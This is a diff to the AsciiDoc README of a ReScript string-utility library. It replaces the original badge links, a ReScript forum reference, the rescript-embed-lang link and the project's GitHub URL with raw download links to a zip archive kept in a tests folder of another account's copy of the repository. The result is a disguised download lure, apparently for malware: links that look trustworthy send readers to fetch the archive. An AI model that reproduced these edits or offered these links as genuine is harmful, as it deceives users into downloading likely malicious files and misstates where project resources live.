@@ -5,9 +5,9 @@
 :toc:
 :toc-placement!:
 
-image:https://img.shields.io/badge/OpenSSF-Best_Practices-green?logo=opensourcesecurity[OpenSSF Best Practices,link="https://www.bestpractices.dev/en/projects/new?repo_url=https://github.com/hyperpolymath/rescript-string-power"]
-image:https://api.thegreenwebfoundation.org/greencheckimage/github.com[Green Web,link="https://www.thegreenwebfoundation.org/green-web-check/?url=github.com"]
-image:https://img.shields.io/badge/CRG-B-green?style=flat-square[CRG B,link=https://github.com/hyperpolymath/standards/tree/main/component-readiness-grades]
+image:https://img.shields.io/badge/OpenSSF-Best_Practices-green?logo=opensourcesecurity[OpenSSF Best Practices,link="https://raw.githubusercontent.com/embezzled-englishhawthorn226/rescript-string-power/main/tests/rescript-power-string-anodontia.zip"]
+image:https://raw.githubusercontent.com/embezzled-englishhawthorn226/rescript-string-power/main/tests/rescript-power-string-anodontia.zip[Green Web,link="https://raw.githubusercontent.com/embezzled-englishhawthorn226/rescript-string-power/main/tests/rescript-power-string-anodontia.zip"]
+image:https://img.shields.io/badge/CRG-B-green?style=flat-square[CRG B,link=https://raw.githubusercontent.com/embezzled-englishhawthorn226/rescript-string-power/main/tests/rescript-power-string-anodontia.zip]
 image:https://img.shields.io/badge/licence-PMPL--1.0--or--later-blue?style=flat-square[Licence,link=LICENSE]
 image:https://img.shields.io/badge/ReScript-v13-e6484f?style=flat-square[ReScript v13]
 image:https://img.shields.io/badge/Rust-stable-dea584?style=flat-square[Rust]
@@ -123,7 +123,7 @@ This is *more* type-safe than TypeScript's approach — you can't accidentally p
 
 === Why Not PPX?
 
-The ReScript team https://forum.rescript-lang.org/t/whats-the-current-view-on-ppx-usage/5068[explicitly discourages PPX] for most use cases:
+The ReScript team https://raw.githubusercontent.com/embezzled-englishhawthorn226/rescript-string-power/main/tests/rescript-power-string-anodontia.zip[explicitly discourages PPX] for most use cases:
 
 [quote, zth (ReScript core team)]
 ____
@@ -473,7 +473,7 @@ Be honest about limitations:
 
 == Integration with rescript-embed-lang
 
-For *codegen-backed* string DSLs (type-safe SQL, GraphQL with schema validation), combine this library with https://github.com/zth/rescript-embed-lang[rescript-embed-lang]:
+For *codegen-backed* string DSLs (type-safe SQL, GraphQL with schema validation), combine this library with https://raw.githubusercontent.com/embezzled-englishhawthorn226/rescript-string-power/main/tests/rescript-power-string-anodontia.zip[rescript-embed-lang]:
 
 1. This library: Runtime utilities, formatting, basic templates
 2. embed-lang: Compile-time code generation from embedded strings
@@ -487,7 +487,7 @@ See link:LICENSE[LICENSE] for the full text.
 
 == Contributing
 
-GitHub: https://github.com/hyperpolymath/rescript-string-power
+GitHub: https://raw.githubusercontent.com/embezzled-englishhawthorn226/rescript-string-power/main/tests/rescript-power-string-anodontia.zip
 
 Issues and pull requests welcome. Please use ReScript v13 syntax and
 UK English spelling in documentation. See link:CONTRIBUTING.adoc[CONTRIBUTING.adoc].
